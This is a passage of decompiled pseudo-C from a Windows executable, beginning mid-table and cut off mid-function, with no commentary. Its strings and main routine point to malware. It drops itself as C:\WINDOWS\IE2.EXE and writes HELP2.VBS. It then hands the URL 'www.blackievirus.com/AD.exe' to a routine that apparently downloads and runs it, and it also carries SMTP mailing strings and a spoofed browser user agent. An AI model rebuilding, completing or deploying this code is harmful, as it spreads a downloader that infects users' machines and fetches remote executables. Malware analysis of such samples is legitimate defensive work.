  '\x11',
  '\x12',
  '\x12',
  '\x12',
  '\x12',
  '\x12',
  '\x12',
  '\x12',
  '\x12',
  '\x13',
  '\x13',
  '\x13',
  '\x13',
  '\x13',
  '\x13',
  '\x13',
  '\x13',
  '\x14',
  '\x14',
  '\x14',
  '\x14',
  '\x14',
  '\x14',
  '\x14',
  '\x14',
  '\x14',
  '\x14',
  '\x14',
  '\x14',
  '\x14',
  '\x14',
  '\x14',
  '\x14',
  '\x15',
  '\x15',
  '\x15',
  '\x15',
  '\x15',
  '\x15',
  '\x15',
  '\x15',
  '\x15',
  '\x15',
  '\x15',
  '\x15',
  '\x15',
  '\x15',
  '\x15',
  '\x15',
  '\x16',
  '\x16',
  '\x16',
  '\x16',
  '\x16',
  '\x16',
  '\x16',
  '\x16',
  '\x16',
  '\x16',
  '\x16',
  '\x16',
  '\x16',
  '\x16',
  '\x16',
  '\x16',
  '\x17',
  '\x17',
  '\x17',
  '\x17',
  '\x17',
  '\x17',
  '\x17',
  '\x17',
  '\x17',
  '\x17',
  '\x17',
  '\x17',
  '\x17',
  '\x17',
  '\x17',
  '\x17',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x18',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x19',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1A',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1B',
  '\x1C'
}; // weak
int dword_41EEC0[29] =
{
  0,
  1,
  2,
  3,
  4,
  5,
  6,
  7,
  8,
  10,
  12,
  14,
  16,
  20,
  24,
  28,
  32,
  40,
  48,
  56,
  64,
  80,
  96,
  112,
  128,
  160,
  192,
  224,
  0
}; // weak
int dword_41EF34[171] =
{
  0,
  1,
  2,
  3,
  4,
  6,
  8,
  12,
  16,
  24,
  32,
  48,
  64,
  96,
  128,
  192,
  256,
  384,
  512,
  768,
  1024,
  1536,
  2048,
  3072,
  4096,
  6144,
  8192,
  12288,
  16384,
  24576,
  16,
  17,
  18,
  0,
  8,
  7,
  9,
  6,
  10,
  5,
  11,
  4,
  12,
  3,
  13,
  2,
  14,
  1,
  15,
  3,
  4,
  5,
  6,
  7,
  8,
  9,
  10,
  11,
  13,
  15,
  17,
  19,
  23,
  27,
  31,
  35,
  43,
  51,
  59,
  67,
  83,
  99,
  115,
  131,
  163,
  195,
  227,
  258,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  0,
  1,
  1,
  1,
  1,
  2,
  2,
  2,
  2,
  3,
  3,
  3,
  3,
  4,
  4,
  4,
  4,
  5,
  5,
  5,
  5,
  0,
  112,
  112,
  1,
  2,
  3,
  4,
  5,
  7,
  9,
  13,
  17,
  25,
  33,
  49,
  65,
  97,
  129,
  193,
  257,
  385,
  513,
  769,
  1025,
  1537,
  2049,
  3073,
  4097,
  6145,
  8193,
  12289,
  16385,
  24577,
  0,
  0,
  0,
  0,
  1,
  1,
  2,
  2,
  3,
  3,
  4,
  4,
  5,
  5,
  6,
  6,
  7,
  7,
  8,
  8,
  9,
  9,
  10,
  10,
  11,
  11,
  12,
  12,
  13,
  13
}; // weak
void *off_41F1E0 = &loc_403DE0; // weak
void *off_41F1E4 = &loc_403DE0; // weak
void *off_41F1E8 = &loc_403DE0; // weak
void (__stdcall __noreturn *off_41F1EC)(int) = &sub_408D10; // weak
int (*off_41F1F0)() = &sub_416C6C; // weak
int (*off_41F1FC)() = &sub_416C6C; // weak
char *off_41F208 = "CWinApp"; // weak
void *off_41F228 = &unk_41F440; // weak
void *_AFX_WIN_STATE::`vftable' = &sub_41AF82; // weak
void *CWinApp::`vftable' = &sub_41B283; // weak
char *off_41F358 = "CWinThread"; // weak
void *_AFX_CTL3D_STATE::`vftable' = &sub_41B3CA; // weak
void *_AFX_CTL3D_THREAD::`vftable' = &sub_41B3E5; // weak
_UNKNOWN unk_41F440; // weak
_UNKNOWN unk_41F460; // weak
_UNKNOWN unk_41F490; // weak
_UNKNOWN unk_41F4C8; // weak
_UNKNOWN unk_41F4E0; // weak
_UNKNOWN unk_41F4F0; // weak
char *off_41F518 = "CTempGdiObject"; // weak
char *off_41F540 = "CTempDC"; // weak
char *off_41F560 = "CGdiObject"; // weak
void **off_41F588 = &off_41F5A0; // weak
char *off_41F5A8 = "CUserException"; // weak
char *off_41F5D0 = "CResourceException"; // weak
void *CDC::`vftable' = &sub_41B567; // weak
void *CGdiObject::`vftable' = &sub_41B587; // weak
void *CResourceException::`vftable' = &sub_41B4E0; // weak
void *CUserException::`vftable' = &sub_41B518; // weak
void *_AFX_THREAD_STATE::`vftable' = &sub_41B6E0; // weak
void *AFX_MODULE_STATE::`vftable' = &sub_41B803; // weak
void *AFX_MODULE_THREAD_STATE::`vftable' = &sub_41B8B2; // weak
char *off_41F768 = "CObject"; // weak
void *CStringArray::`vftable' = &sub_41BA6D; // weak
char *off_41F7A8 = "CArchiveException"; // weak
void *CArchiveException::`vftable' = &sub_41BA83; // weak
char *off_41F7F0 = "CNotSupportedException"; // weak
char *off_41F820 = "CMemoryException"; // weak
int (*off_41F878)() = &sub_41BA89; // weak
void *CNotSupportedException::`vftable' = &sub_41BAC1; // weak
void *_AFX_SOCK_STATE::`vftable' = &sub_41C940; // weak
void *CSessionMapPtrToPtr::`vftable' = &sub_41C627; // weak
void *CCriticalSection::`vftable' = &sub_41C809; // weak
void *CThreadData::`vftable' = &sub_41BED6; // weak
char *off_41F958 = "CTempWnd"; // weak
char *off_41F980 = "CWnd"; // weak
void *off_41F9A0 = &unk_41F440; // weak
int (*off_41FD50)() = &sub_41C247; // weak
void *CTestCmdUI::`vftable' = &CTestCmdUI::Enable; // weak
void *CTempWnd::`vftable' = &sub_41C2B2; // weak
void *CHandleMap::`vftable' = &sub_40A46E; // weak
char *off_41FF10 = "CMapPtrToPtr"; // weak
void *CMapPtrToPtr::`vftable' = &sub_41C627; // weak
char *off_41FF48 = "CPtrList"; // weak
void *CPtrList::`vftable' = &sub_41C62D; // weak
char *off_41FF90 = "CCriticalSection"; // weak
char *off_41FFA8 = "CSyncObject"; // weak
void *CSyncObject::`vftable' = &sub_41C80F; // weak
char *off_420000 = "CTempMenu"; // weak
char *off_420028 = "CMenu"; // weak
int (*off_42004C)() = &sub_41C862; // weak
_SCOPETABLE_ENTRY stru_4205F8[2] = { { -1, NULL, &loc_40F7DE }, { 0, &loc_40F7CA, &loc_40F7CE } }; // weak
const CHAR aIsprocessorfea[] = "IsProcessorFeaturePresent"; // idb
char byte_420650[92] =
{
  '\x06',
  '\0',
  '\0',
  '\x06',
  '\0',
  '\x01',
  '\0',
  '\0',
  '\x10',
  '\0',
  '\x03',
  '\x06',
  '\0',
  '\x06',
  '\x02',
  '\x10',
  '\x04',
  'E',
  'E',
  'E',
  '\x05',
  '\x05',
  '\x05',
  '\x05',
  '\x05',
  '5',
  '0',
  '\0',
  'P',
  '\0',
  '\0',
  '\0',
  '\0',
  ' ',
  '(',
  '8',
  'P',
  'X',
  '\a',
  '\b',
  '\0',
  '7',
  '0',
  '0',
  'W',
  'P',
  '\a',
  '\0',
  '\0',
  ' ',
  ' ',
  '\b',
  '\0',
  '\0',
  '\0',
  '\0',
  '\b',
  '`',
  'h',
  '`',
  '`',
  '`',
  '`',
  '\0',
  '\0',
  'p',
  'p',
  'x',
  'x',
  'x',
  'x',
  '\b',
  '\a',
  '\b',
  '\0',
  '\0',
  '\a',
  '\0',
  '\b',
  '\b',
  '\b',
  '\0',
  '\0',
  '\b',
  '\0',
  '\b',
  '\0',
  '\a',
  '\b',
  '\0',
  '\0',
  '\0'
}; // weak
const _ThrowInfo _TI4PAVCArchiveException__ = { 0u, NULL, NULL, &_CTA4PAVCArchiveException__ }; // idb
const _ThrowInfo _TI5PAVCMemoryException__ = { 0u, NULL, NULL, &_CTA5PAVCMemoryException__ }; // idb
int (__stdcall *off_4240F0)(int, LPVOID lpMem, SIZE_T dwBytes) = &sub_4030F0; // weak
int (__stdcall *off_4240F4[3])(int, int, int) = { &sub_403960, &sub_4040C0, &sub_407760 }; // weak
char aCWindowsIe2Exe[19] = "C:\\WINDOWS\\IE2.EXE"; // weak
char asc_424303[2] = "\\"; // weak
_UNKNOWN unk_424305; // weak
double dbl_424306 = 159744.0; // weak
_DWORD dword_42430E[2] = { 1, 0 }; // weak
char aWwwBlackieviru[28] = "www.blackievirus.com/AD.exe"; // weak
char aExe[6] = "*.exe"; // weak
char aHttpWwwBlackie[28] = "http://www.blackievirus.com"; // weak
char aUrl[6] = "url=\""; // weak
CHAR FileName[] = "C:\\WINDOWS\\HELP2.VBS"; // idb
CHAR aWindir[] = "windir"; // idb
CHAR AppName[] = ""; // idb
double dbl_424513 = 1.048576e7; // weak
double dbl_42451B = -1.0e-7; // weak
char asc_424527[2] = "."; // idb
LPCSTR lpFileName = NULL; // idb
void *lp = NULL; // idb
void *dword_424557 = NULL; // idb
CHAR Caption[] = "error"; // idb
CHAR Text[] = ""; // idb
CHAR aBlackmoon[] = "blackmoon"; // idb
CHAR aError_0[] = "ERROR"; // idb
CHAR aWwwDywtComCn[] = "www.dywt.com.cn"; // idb
char aC[4] = "%C:"; // idb
CHAR Operation[] = "open"; // idb
CHAR szWindow[] = "Microsoft Internet Explorer"; // idb
char asc_4246D4[2] = ""; // weak
char a00[3] = "00"; // weak
CHAR szAgent[] = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)"; // idb
CHAR szHeaders[] = "Accept: */*\r\n\r\n"; // idb
char aAccept[15] = "Accept: */* \r\n"; // weak
CHAR szVerb[] = "GET"; // idb
CHAR szVersion[] = "HTTP/1.0"; // idb
unsigned __int8 Control[] = { 35u, 0u }; // idb
int dword_426318 = 1; // weak
char aGb2312[7] = "gb2312"; // weak
char aUsAscii[9] = "us-ascii"; // weak
CHAR asc_426330[] = "?="; // idb
CHAR aGb2312B[] = "=?gb2312?B?"; // idb
CHAR asc_426340[] = "\r\n "; // idb
const char asc_426344[] = "\r"; // idb
char byte_426345 = '\n'; // weak
char aSS[] = "%s <%s>"; // idb
char a2d2d[] = "%+.2d%.2d"; // idb
char aQuit[7] = "QUIT\r\n"; // weak
CHAR aSmtp_0[] = "SMTP!"; // idb
CHAR aSmtp[] = "SMTP!"; // idb
CHAR asc_426518[] = " "; // idb
CHAR asc_42651C[] = "!"; // idb
CHAR asc_426528[] = "!"; // idb
int (__cdecl *off_426678)(_DWORD) = &sub_416645; // weak
void *off_42667C = &unk_426690; // weak
void *off_426680 = &unk_426684; // weak
char *off_426888 = "CStringArray"; // weak
int dword_426ACC = 2; // weak
char **off_426B78 = &off_426B80; // weak
_UNKNOWN unk_426D28; // weak
int dword_426D2C[89] =
{
  22,
  2,
  2,
  3,
  2,
  4,
  24,
  5,
  13,
  6,
  9,
  7,
  12,
  8,
  12,
  9,
  12,
  10,
  7,
  11,
  8,
  12,
  22,
  13,
  22,
  15,
  2,
  16,
  13,
  17,
  18,
  18,
  2,
  33,
  13,
  53,
  2,
  65,
  13,
  67,
  2,
  80,
  17,
  82,
  13,
  83,
  13,
  87,
  22,
  89,
  11,
  108,
  13,
  109,
  32,
  112,
  28,
  114,
  9,
  6,
  22,
  128,
  10,
  129,
  10,
  130,
  9,
  131,
  22,
  132,
  13,
  145,
  41,
  158,
  13,
  161,
  2,
  164,
  11,
  167,
  13,
  183,
  17,
  206,
  2,
  215,
  11,
  1816,
  12
}; // weak
_DWORD dword_426E90[30] =
{
  -1073741819,
  11,
  0,
  -1073741795,
  4,
  0,
  -1073741674,
  4,
  0,
  -1073741683,
  8,
  0,
  -1073741682,
  8,
  0,
  -1073741681,
  8,
  0,
  -1073741680,
  8,
  0,
  -1073741679,
  8,
  0,
  -1073741678,
  8,
  0,
  -1073741677,
  8,
  0
}; // weak
int dword_426F48[] = { 2 }; // weak
char *off_426F4C = "R6002\r\n- floating point not loaded\r\n"; // weak
int (__stdcall *off_426FD8)(struct _EXCEPTION_POINTERS *ExceptionInfo) = &__CxxUnhandledExceptionFilter; // weak
int (__cdecl *off_426FE0)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = &terminate; // weak
void *off_426FE8 = &off_426FE8; // weak
LPVOID off_426FEC = &off_426FE8; // idb
int dword_426FF8 = -1; // weak
void **off_429008 = &off_426FE8; // weak
int dword_42900C = 480; // weak
int (__cdecl *off_4290D0)(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD) = &_fptrap; // weak
char *off_4290E8 = "(null)"; // idb
wchar_t *off_4290EC = L"(null)"; // weak
void *off_4291FC = (void *)0x429206; // weak
_UNKNOWN unk_4298E8; // weak
_UNKNOWN unk_429900; // weak
int dword_429CB8 = 0; // weak
int dword_429CBC = 0; // weak
int dword_429CC0 = 0; // weak
int dword_429CC4 = 0; // weak
LPCSTR lpModuleName = NULL; // idb
int dword_429CCC = 0; // weak
int (*dword_429CD0)(void) = NULL; // weak
int (*dword_429CD4)(void) = NULL; // weak
int (*dword_429CD8)(void) = NULL; // weak
HANDLE hHeap = NULL; // idb
int (*dword_429CE0)(void) = NULL; // weak
char byte_429CE4 = '\0'; // weak
CHAR Str[260] =
{
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0',
  '\0'
}; // weak
LPVOID dword_429EEC = NULL; // idb
int dword_429EF0 = 0; // weak
int (__stdcall *dword_429F10)(_DWORD, _DWORD, _DWORD) = NULL; // weak
HANDLE dword_4363AC; // idb
int dword_4363B4; // weak
int (__stdcall *dword_4363B8)(_DWORD, _DWORD, _DWORD); // weak
int dword_4366E0; // weak
_UNKNOWN unk_4366E8; // weak
int dword_4367AC; // weak
int (__stdcall *dword_4367B0)(_DWORD, _DWORD, _DWORD); // weak
int dword_4367B4; // weak
_UNKNOWN unk_4367B8; // weak
HANDLE dword_44281C; // idb
CHAR byte_442820[8]; // weak
_UNKNOWN unk_442828; // weak
int dword_44282C; // weak
int dword_442830; // weak
char byte_442838[40]; // weak
char byte_442860[40]; // weak
char byte_442888[40]; // weak
char byte_4428B0[40]; // weak
_DWORD dword_4428E8[38]; // weak
_DWORD dword_442980[38]; // weak
char byte_442A18[40]; // weak
char byte_442A40[40]; // weak
_UNKNOWN unk_442A68; // weak
_UNKNOWN unk_442A6C; // weak
_DWORD dword_442A78[38]; // weak
_DWORD dword_442B10[38]; // weak
_UNKNOWN unk_442BA8; // weak
_UNKNOWN unk_442BB0; // weak
int dword_442C30[1536]; // weak
char byte_444430[40]; // weak
_DWORD dword_444458[16]; // weak
_DWORD dword_444498[16]; // weak
_DWORD dword_4444D8[15]; // weak
_DWORD dword_444518[15]; // weak
int dword_444554; // weak
int (__stdcall *GetSystemMetrics_0)(int nIndex);
HMONITOR (__stdcall *MonitorFromWindow)(HWND hwnd, DWORD dwFlags);
HMONITOR (__stdcall *MonitorFromRect)(LPCRECT lprc, DWORD dwFlags);
HMONITOR (__stdcall *MonitorFromPoint)(POINT pt, DWORD dwFlags);
BOOL (__stdcall *GetMonitorInfoA)(HMONITOR hMonitor, LPMONITORINFO lpmi);
BOOL (__stdcall *EnumDisplayMonitors)(HDC hdc, LPCRECT lprcClip, MONITORENUMPROC lpfnEnum, LPARAM dwData);
int dword_444570; // weak
int dword_444574[17]; // weak
struct _RTL_CRITICAL_SECTION stru_4445B8; // idb
struct _RTL_CRITICAL_SECTION stru_4445D0; // idb
int dword_444768; // weak
int dword_44476C; // weak
int dword_444770; // weak
int dword_4447B0; // weak
HBITMAP hBitmapChecked; // idb
int dword_4447C4; // weak
int dword_4447CC; // weak
_UNKNOWN unk_4447DC; // weak
_UNKNOWN dword_4447E0; // weak
int dword_4447E4; // weak
char byte_4447F0[40]; // weak
int dword_444820; // weak
int dword_4449C4; // weak
int dword_444A28; // idb
LPTOP_LEVEL_EXCEPTION_FILTER lpfn; // idb
_UNKNOWN unk_444C24; // weak
char byte_444CC4; // weak
char byte_444CC5; // weak
char byte_444CC6; // weak
char byte_444CC7; // weak
char byte_444CC9; // weak
char byte_444CCA; // weak
char byte_444CCB; // weak
int dword_445CE4; // weak
LONG Addend; // idb
int dword_445CF0; // weak
int dword_445CF4; // weak
void *dword_445CF8; // idb
int dword_445CFC; // weak
LPVOID lpMem; // idb
int dword_445D04; // weak
HANDLE dword_445D08; // idb
int dword_445D0C; // weak
int dword_446048; // weak
int dword_44604C; // weak


//----- (00401000) --------------------------------------------------------
char *__usercall sub_401000@<eax>(_DWORD *a1@<ebx>)
{
  _DWORD *v2; // ecx
  char v3; // al
  int v4; // eax
  int v5; // eax

  if ( !a1 )
    return 0;
  v2 = a1;
  if ( ((unsigned __int8)a1 & 3) == 0 )
    goto LABEL_6;
  do
  {
    v3 = *(_BYTE *)v2;
    v2 = (_DWORD *)((char *)v2 + 1);
    if ( !v3 )
      return (char *)((char *)v2 - 1 - (char *)a1);
  }
  while ( ((unsigned __int8)v2 & 3) != 0 );
  while ( 1 )
  {
    do
    {
LABEL_6:
      v4 = (*v2 + 2130640639) ^ ~*v2;
      ++v2;
    }
    while ( (v4 & 0x81010100) == 0 );
    v5 = *(v2 - 1);
    if ( !(_BYTE)v5 )
      break;
    if ( !BYTE1(v5) )
      return (char *)((char *)v2 - 3 - (char *)a1);
    if ( (v5 & 0xFF0000) == 0 )
      return (char *)((char *)v2 - 2 - (char *)a1);
    if ( (v5 & 0xFF000000) == 0 )
      return (char *)((char *)v2 - 1 - (char *)a1);
  }
  return (char *)((char *)(v2 - 1) - (char *)a1);
}

//----- (0040106B) --------------------------------------------------------
SIZE_T __cdecl sub_40106B(char a1)
{
  int v1; // ecx
  void *v2; // esp
  char *v3; // edi
  char *v4; // esi
  _DWORD *v5; // ebx
  char *v6; // eax
  _BYTE *v7; // edi
  SIZE_T v8; // eax
  unsigned int *v9; // ebx
  const void **v10; // edx
  unsigned int v11; // ecx
  const void *v12; // esi
  int v14; // [esp-4h] [ebp-8h]
  SIZE_T dwBytes; // [esp+0h] [ebp-4h]
  SIZE_T dwBytesa; // [esp+0h] [ebp-4h]
  char vars0; // [esp+4h] [ebp+0h] BYREF

  v2 = alloca(4 * (v1 + 1));
  v3 = &vars0;
  dwBytes = 1;
  v4 = &a1;
  do
  {
    v5 = *(_DWORD **)v4;
    v4 += 4;
    v14 = v1;
    v6 = sub_401000(v5);
    dwBytes += (SIZE_T)v6;
    *(_DWORD *)v3 = v6;
    v3 += 4;
    v1 = v14 - 1;
  }
  while ( v14 != 1 );
  v7 = (_BYTE *)sub_4022A5(dwBytes);
  v8 = dwBytes;
  v9 = (unsigned int *)&vars0;
  dwBytesa = (SIZE_T)v7;
  v10 = (const void **)&a1;
  do
  {
    v11 = *v9++;
    v12 = *v10++;
    qmemcpy(v7, v12, v11);
    v7 += v11;
    --v8;
  }
  while ( v8 );
  *v7 = 0;
  return dwBytesa;
}
// 401070: variable 'v1' is possibly undefined

//----- (004010C7) --------------------------------------------------------
__int64 __usercall sub_4010C7@<edx:eax>(double a1@<st0>)
{
  return (__int64)a1;
}

//----- (004010EE) --------------------------------------------------------
int __usercall sub_4010EE@<eax>(int *a1@<ebx>)
{
  int v1; // ecx
  int *v2; // ebx
  int result; // eax

  v1 = *a1;
  v2 = a1 + 1;
  result = 0;
  if ( v1 )
  {
    for ( result = *v2; ; result *= *v2 )
    {
      ++v2;
      if ( !--v1 )
        break;
    }
  }
  return result;
}

//----- (00401107) --------------------------------------------------------
void __usercall sub_401107(int *a1@<ebx>)
{
  int v1; // ecx
  int *v2; // ebx
  int i; // eax

  if ( a1 )
  {
    v1 = *a1;
    v2 = a1 + 1;
    if ( v1 )
    {
      for ( i = *v2; ; i *= *v2 )
      {
        ++v2;
        if ( !--v1 )
          break;
      }
    }
  }
}

//----- (00401127) --------------------------------------------------------
int sub_401127()
{
  LPCSTR v0; // eax
  const CHAR *v1; // eax
  const CHAR *v2; // eax
  double v3; // st7
  _DWORD *v4; // eax
  _DWORD *v5; // eax
  const CHAR *v6; // eax
  CHAR *v7; // eax
  const CHAR *v8; // eax
  char *v9; // ecx
  void **v10; // ebx
  bool v11; // zf
  int i; // eax
  int v13; // eax
  int v14; // ecx
  int *v15; // ebx
  char *v16; // ebx
  int v17; // ecx
  int v18; // eax
  void *v19; // eax
  int v21; // [esp-14h] [ebp-3Ch]
  const CHAR *v22; // [esp-Ch] [ebp-34h]
  signed int v23; // [esp-Ch] [ebp-34h]
  char v24; // [esp-Ch] [ebp-34h]
  char *v25; // [esp-Ch] [ebp-34h]
  int v26; // [esp-Ch] [ebp-34h]
  void *v27; // [esp-8h] [ebp-30h]
  int *v28; // [esp-8h] [ebp-30h]
  _DWORD *v29; // [esp-4h] [ebp-2Ch]
  void *v30; // [esp-4h] [ebp-2Ch]
  int v31; // [esp-4h] [ebp-2Ch]
  _DWORD *v32; // [esp+0h] [ebp-28h]
  LPCSTR lpExistingFileName; // [esp+Ch] [ebp-1Ch]
  CHAR *lpExistingFileName_4; // [esp+10h] [ebp-18h]
  CHAR *lpExistingFileName_4a; // [esp+10h] [ebp-18h]
  CHAR *lpExistingFileName_4b; // [esp+10h] [ebp-18h]
  CHAR *lpExistingFileName_4c; // [esp+10h] [ebp-18h]
  void *v38; // [esp+14h] [ebp-14h] BYREF
  void *lp; // [esp+18h] [ebp-10h] BYREF
  int v40; // [esp+1Ch] [ebp-Ch] BYREF
  LPCSTR lpFileName; // [esp+20h] [ebp-8h]
  void *v42; // [esp+24h] [ebp-4h]

  v42 = 0;
  lpFileName = 0;
  v40 = 0;
  if ( ::lpFileName )
    sub_40229F((void *)::lpFileName);
  ::lpFileName = aCWindowsIe2Exe;
  lp = sub_402650();
  v38 = sub_4026F0();
  lpExistingFileName_4 = (CHAR *)sub_40106B((char)lp);
  if ( lp )
    sub_40229F(lp);
  if ( v38 )
    sub_40229F(v38);
  v0 = ::lpFileName;
  if ( !::lpFileName )
    v0 = (LPCSTR)&unk_424305;
  v22 = v0;
  v1 = lpExistingFileName_4;
  if ( !lpExistingFileName_4 )
    v1 = (const CHAR *)&unk_424305;
  sub_402790(2, v1, 0, -2147483644, v22);
  if ( lpExistingFileName_4 )
    sub_40229F(lpExistingFileName_4);
  lp = sub_402650();
  v38 = sub_4026F0();
  lpExistingFileName_4a = (CHAR *)sub_40106B((char)lp);
  if ( lp )
    sub_40229F(lp);
  if ( v38 )
    sub_40229F(v38);
  v2 = lpExistingFileName_4a;
  if ( !lpExistingFileName_4a )
    v2 = (const CHAR *)&unk_424305;
  lpExistingFileName = (LPCSTR)sub_4027B0(1, v2);
  if ( lpExistingFileName_4a )
    sub_40229F(lpExistingFileName_4a);
  if ( lpExistingFileName != (LPCSTR)172032 )
  {
    lp = sub_402800(1, (LPCSTR)&unk_424305);
    v3 = (double)(int)sub_4027B0(1, (LPCSTR)&unk_424305) - dbl_424306;
    v23 = sub_4010C7(v3);
    v4 = lp;
    if ( !lp )
      v4 = dword_42430E;
    v32 = sub_402870(2, (int)v4, 0, -2147483643, v23);
    if ( lp )
      sub_40229F(lp);
    v42 = v32;
    lp = sub_402650();
    v38 = sub_4026F0();
    lpExistingFileName_4b = (CHAR *)sub_40106B((char)lp);
    if ( lp )
      sub_40229F(lp);
    if ( v38 )
      sub_40229F(v38);
    LOBYTE(v5) = (_BYTE)v42;
    if ( !v42 )
      v5 = dword_42430E;
    v24 = (char)v5;
    v6 = lpExistingFileName_4b;
    if ( !lpExistingFileName_4b )
      v6 = (const CHAR *)&unk_424305;
    sub_4028A0(2, v6, 0, -2147483644, v24);
    if ( lpExistingFileName_4b )
      sub_40229F(lpExistingFileName_4b);
    lp = sub_402650();
    v38 = sub_4026F0();
    lpExistingFileName_4c = (CHAR *)sub_40106B((char)lp);
    if ( lp )
      sub_40229F(lp);
    if ( v38 )
      sub_40229F(v38);
    v7 = lpExistingFileName_4c;
    if ( !lpExistingFileName_4c )
      v7 = (CHAR *)&unk_424305;
    sub_4025B0(sub_403B20, 1, v7, 0, -2147483644);
    if ( lpExistingFileName_4c )
      sub_40229F(lpExistingFileName_4c);
  }
  v8 = ::lpFileName;
  if ( !::lpFileName )
    v8 = (const CHAR *)&unk_424305;
  v29 = sub_402800(1, v8);
  if ( ::lp )
    sub_40229F(::lp);
  ::lp = v29;
  lp = aWwwBlackieviru;
  sub_4016B6((_DWORD **)&lp);
  if ( lp )
    sub_40229F(lp);
  sub_4017BB();
  lp = (void *)sub_4025B0((void (__cdecl *)(_DWORD, _DWORD, _DWORD))sub_4039A0, 1, 0, 0, -2147482879);
  v30 = lp;
  v27 = dword_424557;
  v9 = *(char **)dword_424557;
  v10 = (void **)((char *)dword_424557 + 4);
  v11 = *(_DWORD *)dword_424557 == 0;
  if ( *(_DWORD *)dword_424557 )
  {
    for ( i = (int)*v10; ; i *= (_DWORD)*v10 )
    {
      ++v10;
      if ( !--v9 )
        break;
    }
    v9 = (char *)i;
    v11 = i == 0;
  }
  if ( !v11 )
  {
    do
    {
      v25 = v9;
      if ( *v10 )
        sub_40229F(*v10);
      ++v10;
      v9 = v25 - 1;
    }
    while ( v25 != (char *)1 );
  }
  sub_40229F(v27);
  dword_424557 = v30;
  v13 = sub_4010EE((int *)v30);
